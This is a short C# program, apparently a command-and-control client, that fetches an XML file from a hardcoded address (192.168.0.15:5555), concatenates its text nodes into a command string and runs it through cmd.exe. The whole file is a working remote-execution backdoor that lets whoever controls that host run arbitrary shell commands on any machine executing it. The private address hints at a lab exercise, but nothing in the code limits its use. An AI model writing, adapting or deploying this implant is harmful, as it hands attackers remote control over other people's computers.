using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Xml;


namespace Client
{
    
    public class CCClient
    {

        public static string destination = "http://192.168.0.15:5555/xmlCommand.xml";
       
        private static void Main()
        {
           
            executeCommand();
         
        }

        private static string processXML()
        {
            string command="";
            XmlTextReader readXml = new XmlTextReader(destination);

            while (readXml.Read())
            {

                if (readXml.NodeType is XmlNodeType.Text) //Check is the Node type is Element (<>) or Text 
                {
                    
                    command = command + " " + readXml.Value.ToString();
                }
            }

            return command;
        }
        public static void executeCommand()
        {
            string command = processXML();
           
            System.Diagnostics.Process.Start("cmd.exe",command);

        }
    }
}